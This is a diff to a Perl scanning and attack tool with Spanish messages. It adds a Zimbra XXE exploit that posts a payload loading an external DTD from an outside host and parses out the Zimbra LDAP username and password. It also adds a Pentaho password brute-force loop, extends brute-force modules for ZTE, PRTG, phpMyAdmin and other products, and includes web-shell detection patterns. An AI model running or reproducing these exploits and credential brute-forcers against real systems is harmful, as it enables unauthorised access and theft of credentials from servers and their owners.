@@ -144,6 +144,7 @@ foreach my $file (@links) {
 	##############  thread ##############
 	my $response = $self->dispatch(url => $url,method => 'GET',headers => $headers);
 	my $status = $response->status_line;
+	#print " pinche status $status \n";
 	my $decoded_content = $response->decoded_content;
 		 
 	if ($error404 ne '')		
@@ -154,11 +155,15 @@ foreach my $file (@links) {
 		}
 	
 	# check body and headers
-	my $backdoor=" ";
+	my $vuln=" ";
 	if ($decoded_content =~ / RAT |C99Shell|b374k| r57 | wso | pouya | Kacak /i){	 
-		$backdoor = " (Posible Backdoor)\t";
+		$vuln = " (Posible Backdoor)\t";
 	}
 	
+	if($decoded_content =~ /Directory of|Index of|Parent directory/i)
+		{$vuln = " (Listado directorio activo)\t";} 	
+	
+	#print " pinche status2 $status \n";
 	if($status !~ /404|500|303|301|503|400/m){		
 		my @status_array = split(" ",$status);	
 		my $current_status = $status_array[0];
@@ -167,7 +172,7 @@ foreach my $file (@links) {
 		$options = $response2->{_headers}->{allow};	
 		$options =~ s/GET|HEAD|POST|OPTIONS//g; # delete safe methods	
 		$options =~ s/,,//g; # delete safe methods	
-		print "$current_status\t$url$backdoor $options \n";
+		print "$current_status\t$url$vuln $options \n";
 		#$result_table->add($url,$status,$options);			
 	}
 	
@@ -502,6 +507,40 @@ if ($module eq "zte")
 	print "$decoded_response \n";
 }
 
+if ($module eq "zimbraXXE")
+{
+	
+	my $xml= "<!DOCTYPE Autodiscover [
+        <!ENTITY % dtd SYSTEM 'https://hackworld1.github.io/zimbraUser.dtd'>
+        %dtd;
+        %all;
+        ]>
+	<Autodiscover xmlns='http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a'>
+    <Request>
+        <EMailAddress>aaaaa</EMailAddress>
+        <AcceptableResponseSchema>&fileContents;</AcceptableResponseSchema>
+    </Request>
+	</Autodiscover>";
+
+	my $response = $self->dispatch(url => $url."Autodiscover/Autodiscover.xml",method => 'POST_FILE',post_data =>$xml,  headers => $headers);
+	my $decoded_response = $response->decoded_content;
+	
+	$decoded_response =~ s/&gt;/>/g; 
+	$decoded_response =~ s/&lt;/</g; 
+	
+	print "$decoded_response \n";
+	
+	if($decoded_response =~ /zimbra/m){	 		
+		$decoded_response =~ /name="zimbra_user">\n    <value>(.*?)</;
+		my $username = $1; 
+	
+		$decoded_response =~ /name="zimbra_ldap_password">\n    <value>(.*?)</;
+		my $password = $1; 
+			
+		print "Credenciales: Usuario: $username password: $password\n";
+	}
+}
+
 }
 
 
@@ -555,7 +594,7 @@ if ($module eq "ZKSoftware")
 		if ($status =~ /200/m)
 		{
 			if  ($decoded_response =~ /Department|Departamento/m){	 
-			print "Password encontrado $url Usuario:$user Password:$password\n";
+			print "Password encontrado: [ZKSoftware] $url Usuario:$user Password:$password\n";
 			last;
 			}							
 		}	
@@ -599,7 +638,7 @@ if ($module eq "zimbra")
 		print "[+] user:$user password:$password status:$status\n";
 		if ($status =~ /302/m)
 		{				 
-			print "Password encontrado $url (Usuario:$user Password:$password)";
+			print "Password encontrado: [zimbra] $url (Usuario:$user Password:$password)";
 			last;
 										
 		}
@@ -614,7 +653,7 @@ if ($module eq "zimbra")
 	close MYINPUT;	
 }#zimbra
 
-
+#ZTE
 if ($module eq "zte")
 {
 			
@@ -656,14 +695,52 @@ if ($module eq "zte")
 		print "[+] user:$user password:$password status:$status\n";
 		if ($status =~ /302/m)
 		{				 
-			print "Password encontrado $url (Usuario:$user Password:$password)\n";
+			print "Password encontrado: [ZTE] $url (Usuario:$user Password:$password)\n";
 			last;
 										
 		}	
 		
 	}
 	close MYINPUT;	
-}#zimbra
+}
+
+# pentaho
+if ($module eq "pentaho")
+{
+			
+	open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
+	while (my $password=<MYINPUT>)
+	{ 
+		$password =~ s/\n//g; 
+		$headers->header("Content-Type" => "application/x-www-form-urlencoded; charset=UTF-8");
+		$headers->header("Accept" => "text/plain, */*; q=0.01");		
+		$headers->header("X-Requested-With" => "XMLHttpRequest");		
+						
+		my $hash_data = {"locale" => "en_US",						 
+						'j_username' => $user, 
+						'j_password' => $password
+				};	
+	
+
+		my $post_data = convert_hash($hash_data);
+		     	   
+		my $response = $self->dispatch(url => $url."pentaho/j_spring_security_check",method => 'POST',post_data =>$post_data, headers => $headers);
+		my $response_headers = $response->headers_as_string;
+		my $decoded_response = $response->decoded_content;
+		my $status = $response->status_line;
+		
+		print "[+] user:$user password:$password status:$status\n";
+		#Location: /pentaho/Home (password OK)		#Location: /pentaho/Login?login_error=1 (password BAD)
+		if ($response_headers =~ /Home/i)
+		{				 
+			print "Password encontrado: [Pentaho] $url (Usuario:$user Password:$password)\n";
+			last;
+										
+		}	
+		
+	}
+	close MYINPUT;	
+}
 
 if ($module eq "PRTG")
 {
@@ -689,7 +766,7 @@ if ($module eq "PRTG")
 		
 		
 		if (! ($response_headers =~ /error/m)){	 
-			print "Password encontrado $url Usuario:$user Password:$password\n";
+			print "Password encontrado: [PRTG] $url Usuario:$user Password:$password\n";
 			last;
 		}
 		
@@ -715,7 +792,7 @@ if ($module eq "phpmyadmin")
 
 		if ($decoded_response =~ /navigation.php\?token|navigation.php\?lang/i &&  $decoded_response =~ /main.php\?token|main.php\?lang=/i)
 		{			
-			print "Password encontrado $url (Sistema sin password)\n";
+			print "Password encontrado: [phpmyadmin] $url (Sistema sin password)\n";
 			last;									
 		}	 
 		
@@ -768,6 +845,9 @@ if ($module eq "phpmyadmin")
 		
 			$response = $self->dispatch(url => $new_url, method => 'GET');
 			$decoded_response = $response->decoded_content;								
+			#open (SALIDA,">phpmyadmin2.html") || die "ERROR: No puedo abrir el fichero google.html\n";
+			#print SALIDA $decoded_response;
+			#close (SALIDA);
 		}
 		
 		print "[+] user:$user password:$password status:$status\n";
@@ -775,10 +855,12 @@ if ($module eq "phpmyadmin")
 		#open (SALIDA,">phpmyadminn.html") || die "ERROR: No puedo abrir el fichero google.html\n";
 		#print SALIDA $decoded_response;
 		#close (SALIDA);
+			
+			
 					
-		if (! ($decoded_response =~ /pma_username/m))
+		if (!($decoded_response =~ /pma_username/m) && !($decoded_response =~ /Cannot log in to the MySQL server/i))
 		{			
-			print "Password encontrado $url Usuario:$user Password:$password\n";
+			print "Password encontrado: [phpmyadmin] $url Usuario:$user Password:$password\n";
 			last;									
 		}	
 		
@@ -801,8 +883,11 @@ my $rport = $self->rport;
 my $ssl = $self->ssl;
 my $path = $self->path;
 
+my $type=""; #Aqui se guarda que tipo de app es taiga/express/camara,etc
 my %options = @_;
 my $log_file = $options{ log_file };
+
+$headers->header("Accept-Encoding" => "gzip, deflate");
 
 my $url;
 if ($ssl)
@@ -822,13 +907,36 @@ else
   }
 
 
-my $response = $self->dispatch(url => $url, method => 'GET', headers => $headers);
+my $response = $self->dispatch(url => $url."nonexistroute123", method => 'GET', headers => $headers);
 my $decoded_response = $response->decoded_content;
-$decoded_response =~ s/'/"/g; 
+my $status = $response->status_line;
 
-my $type="";
-if($decoded_response =~ /Directory of|Index of|Parent directory/i)
-	{$type=$type."Listado directorio activo";} 	
+if($decoded_response =~ /Django|laravel|error message|app\/controllers/i){	 
+	$type=$type."|Debug habilitado";
+}
+elsif($status =~ /200/m)
+{
+	$type=$type."|NodeJS";
+} 
+$response = $self->dispatch(url => $url, method => 'GET', headers => $headers);
+my $last_url = $response->request()->uri();
+print "url $url last_url $last_url \n" if ($debug);
+
+#Peticion original  https://186.121.202.25/
+my @url_array1 = split("/",$url);
+my $protocolo1 = $url_array1[0];
+
+#Peticion 2 (si fue redireccionada)
+my @url_array2 = split("/",$last_url);
+my $protocolo2 = $url_array2[0];
+
+
+if ($protocolo1 ne $protocolo2)
+	{$type=$type."|HTTPSredirect";}  # hubo redireccion http --> https 
+	
+$decoded_response = $response->decoded_content;
+$decoded_response =~ s/'/"/g; # convertir comilla simple en comilla doble
+
 	
 ### get redirect url ###
 REDIRECT:
@@ -922,6 +1030,24 @@ if ($redirect_url eq '')
 	$redirect_url = $1;	
 }
 
+if ($redirect_url eq '')
+{	
+  #top.document.location.href = "/index.html";
+	$decoded_response =~ /top.document.location.href = "(.*?)"/;
+	$redirect_url = $1;	
+}
+
+if ($redirect_url eq '')
+{	
+  #<meta http-equiv="refresh" content="0.1;url=808gps/login.html"/>  
+	$decoded_response =~ /http-equiv="refresh" content="0.1;url=(.*?)"/;
+	$redirect_url = $1;	
+}
+
+
+
+
+
 # Si la redireccion no tiene la IP
 #if (! ($redirect_url =~ /$rhost/m)){	 
 	#$redirect_url="";
@@ -933,15 +1059,17 @@ if ($redirect_url eq '')
 $redirect_url =~ s/\"//g;  
 print "redirect_url $redirect_url \n" if ($debug);
 
-# mikrotik (no usar redireccion)
-if($redirect_url =~ /webfig/m ){
+# webfig (mikrotik) ..\/ (OWA) no usar redireccion
+if($redirect_url =~ /webfig|\.\.\//m ){
 	$redirect_url="";
+	print "mikrotik/OWA detectado \n" if ($debug);
 }
 # ruta completa
 if($redirect_url =~ /http/m ){	 
 	$response = $self->dispatch(url => $redirect_url, method => 'GET', headers => $headers);
 	$decoded_response = $response->decoded_content; 	 
  }  
+#ruta parcial /cgi-bin/login.htm
 elsif ($redirect_url ne '' )
 {	
 	my $final_url;
@@ -995,7 +1123,7 @@ print "poweredBy $poweredBy \n" if ($debug);
 
 #my $title;#) =~ /<title>(.+)<\/title>/s;
 
-$decoded_response =~ /<title>(.{1,90})<\/title>/s ;
+$decoded_response =~ /<title(.{1,90})<\/title>/s ;
 my $title =$1; 
 $title =~ s/>|\n|\t|\r//g; #borrar saltos de linea
 if ($title eq '')
@@ -1066,9 +1194,7 @@ if ($jquery1 eq '')								  #jquery-1.9.1.min
 print "jquery $jquery1 \n" if ($debug);	
 
 if ($jquery1 ne '')
-	{$poweredBy = $poweredBy."| JQuery ".$jquery1.".".$jquery2;}
-	
-
+	{$poweredBy = $poweredBy."| JQuery ".$jquery1.".".$jquery2;}	
 
 if($decoded_response =~ /GASOLINERA/m)
 	{$type=$type."|"."GASOLINERA";} 		
@@ -1119,7 +1245,7 @@ if($decoded_response =~ /X-ORACLE-DMS/i)
 if($decoded_response =~ /www.enterprisedb.com"><img src="images\/edblogo.png"/i)
 	{$type=$type."|"."Postgres web";}	
 
-if($decoded_response =~ /viewport/i)
+if($decoded_response =~ /src="app\//i)
 	{$type=$type."|"."AngularJS";}			
 
 if($decoded_response =~ /roundcube_sessid/i)
@@ -1128,6 +1254,17 @@ if($decoded_response =~ /roundcube_sessid/i)
 
 if($decoded_response =~ /theme-taiga.css/i)
 	{$type=$type."|"."Taiga";}	 
+
+if($decoded_response =~ /Web Services/i)	
+	{$type=$type."|"."Web Service";$title="Web Service" if ($title eq "");}	
+
+if($decoded_response =~ /Acceso no autorizado/i)
+	{$title="Acceso no autorizado" if ($title eq "");} 	
+	
+if($type eq '' && $decoded_response =~ /login/m)
+	{$type=$type."|"."login";}	
+	
+		
 
 
 if($decoded_response =~ /Hikvision Digital/i)
@@ -1143,11 +1280,14 @@ if($decoded_response =~ /pfsense-logo/i)
 	{$title="Pfsense";} 
 
 
-		
-
-if($type eq '' && $decoded_response =~ /login/m)
-	{$type="login";} 			
+if($decoded_response =~ /content="Babelstar"/i)
+	{$title="Body Cam";} 	
 	
+
+if($decoded_response =~ /login to iDRAC/i)
+	{$title="Dell iDRAC";} 
+	
+
 
  my %data = (            
             "title" => $title,
@@ -1399,7 +1539,7 @@ if ($method eq 'POST_MULTIPART')
 if ($method eq 'POST_FILE')
   { 
 	my $post_data = $options{ post_data };         	    
-	$headers->header('Content_Type' => 'application/atom+xml');
+	$headers->header('Content_Type' => 'application/xml');
     my $req = HTTP::Request->new(POST => $url, $headers);
     $req->content($post_data);
     #$response = $self->browser->post( $url, Content_Type => 'application/atom+xml', Content => $post_data, $headers);                 
